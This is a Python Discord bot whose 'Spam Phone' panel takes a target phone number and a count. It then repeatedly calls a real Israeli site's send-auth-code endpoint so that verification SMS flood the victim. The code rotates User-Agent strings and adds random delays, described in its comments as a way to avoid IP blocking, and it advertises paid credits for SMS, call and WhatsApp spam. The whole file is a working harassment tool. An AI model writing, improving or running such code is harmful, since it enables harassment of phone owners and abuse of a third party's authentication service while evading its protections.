import discord
from discord import ui, app_commands
import aiohttp
import asyncio
import os
from dotenv import load_dotenv
import random

load_dotenv()

# הגדרות בסיסיות
TOKEN = os.getenv('DISCORD_TOKEN')

class SpamModal(ui.Modal, title='Spam Control Panel'):
    phone = ui.TextInput(label='Target Phone Number', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    amount = ui.TextInput(label='Amount (Max 50)', placeholder='5', min_length=1, max_length=2)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"🚀 Starting process for {self.phone}...", ephemeral=True)
        
        count = int(str(self.amount))
        target = str(self.phone)
        
        # שימוש ב-Session אחד לכל הבקשות כדי לחסוך במשאבים
        async with aiohttp.ClientSession() as session:
            for i in range(count):
                url = "https://users-auth.hamal.co.il/auth/send-auth-code"
                payload = {"value": target, "type": "phone", "projectId": "1"}
                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                    ])
                }
                
                try:
                    async with session.post(url, json=payload, headers=headers) as resp:
                        print(f"Sent {i+1}/{count} - Status: {resp.status}")
                except Exception as e:
                    print(f"Error: {e}")
                
                # השהייה חכמה למניעת חסימת IP
                await asyncio.sleep(random.uniform(1.5, 3.0))

class ControlView(ui.View):
    def __init__(self):
        super().__init__(timeout=None) # הופך את הכפתור לזמין גם אחרי הפעלה מחדש

    @ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, custom_id="spam_btn", emoji="🧨")
    async def spam_btn(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(SpamModal())

    @ui.button(label="My Credits", style=discord.ButtonStyle.secondary, custom_id="credits_btn", emoji="💰")
    async def credits_btn(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_message("You have 100 credits.", ephemeral=True)

class MyBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        self.add_view(ControlView()) # רישום הכפתור

    async def on_ready(self):
        print(f'Logged in as {self.user}')

bot = MyBot()

@bot.tree.command(name="setup", description="מציב את לוח הבקרה בערוץ")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔥 Spam-Me Control Panel",
        description="Use the buttons below to interact with the bot.\nSending SMS & Call & Whatsapp costs credits.",
        color=discord.Color.red()
    )
    await interaction.response.send_message(embed=embed, view=ControlView())

bot.run(TOKEN)
